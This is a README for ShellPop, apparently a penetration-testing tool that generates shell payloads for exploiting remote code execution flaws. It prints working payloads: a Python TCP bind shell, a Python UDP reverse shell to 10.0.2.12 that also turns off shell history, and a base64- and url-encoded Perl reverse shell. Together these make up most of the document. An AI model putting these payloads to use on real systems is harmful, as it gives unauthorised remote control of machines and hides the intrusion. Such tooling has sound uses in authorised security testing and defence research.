# ShellPop
## Pop shells like a master

## Installation
```bash
root@pc# ./install.sh
```

## List available code for shells
```bash
user@pc$ shellpop --list
```
![Image1](img/photo2.JPG)


## Generate code for RCE vulnerabilities

### Generate a Python TCP bind shell, at port 3333.
```bash
user@pc$ shellpop --number 1 --bind --port 3333

python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',3333));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

### Generate a Python UDP reverse shell, at host 10.0.2.12 and port 1337, urlencoded.
```bash
user@pc$ shellpop --number 2 --reverse --host 10.0.2.12 --port 1337 --urlencode

python%20-c%20%22import%20os%3B%20import%20pty%3B%20import%20socket%3B%20lhost%20%3D%20%2710.0.2.12%27%3B%20lport%20%3D%201337%3B%20s%20%3D%20socket.socket%28socket.AF_INET%2C%20socket.SOCK_DGRAM%29%3B%20s.connect%28%28lhost%2C%20lport%29%29%3B%20os.dup2%28s.fileno%28%29%2C%200%29%3B%20os.dup2%28s.fileno%28%29%2C%201%29%3B%20os.dup2%28s.fileno%28%29%2C%202%29%3B%20os.putenv%28%27HISTFILE%27%2C%20%27/dev/null%27%29%3B%20pty.spawn%28%27/bin/bash%27%29%3B%20s.close%28%29%3B%22%20
```

### Generate a Perl TCP reverse shell, at host 10.0.2.12 and port 3311, base64 and urlencoded.
```bash
user@pc$ shellpop --number 5 --reverse --host 10.0.2.12 --port 3311 --base64 --urlencode

cGVybCAtZSAidXNlIFNvY2tldDtcJGk9JzEwLjAuMi4xMic7XCRwPTMzMTE7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgndGNwJykpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbihcJHAsaW5ldF9hdG9uKFwkaSkpKSl7b3BlbihTVERJTiwnPiZTJyk7b3BlbihTVERPVVQsJz4mUycpO29wZW4oU1RERVJSLCc%2BJlMnKTtleGVjKCcvYmluL3NoIC1pJyk7fTsiIA%3D%3D
```

## More examples
![Image2](img/photo1.jpg)

## Credits

This code is 100% authored by Andre Marques (@zc00l) and it is made open to public the moment
it was released in his github. Any misuse of this code does not makes the author responsible
for the damage it could cause.

If you want to add more commands or improve my program, feel free to send me a pull request.
